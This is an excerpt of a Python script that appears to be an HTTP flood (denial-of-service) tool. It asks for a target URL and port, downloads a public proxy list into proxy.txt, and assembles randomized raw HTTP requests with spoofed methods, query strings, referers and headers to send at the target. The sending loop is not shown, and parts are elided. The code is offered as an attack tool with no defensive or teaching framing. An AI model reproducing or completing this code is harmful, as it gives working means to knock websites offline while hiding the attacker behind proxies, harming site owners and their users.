...
def back():
	os.system("clear")
back()
site = input("[*]Target address {url} ---->> ")
port = int(input("[*]Enter your port {80} ---->> "))
os.system("clear")
linkp = "https://www.proxy-list.download/api/v1/get?type=http"
f = open("proxy.txt",'wb')
r1 = requests.get(linkp)
f.write(r1.content)
proxies = open("proxy.txt").readlines()
host = random.choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +site+":"+str(port)+ "\r\n"
...
referer   = "Referer: " +random.choice(ref) + site + "\r\n"
request = host + useragent + accept + forward + connection + "\r\n"
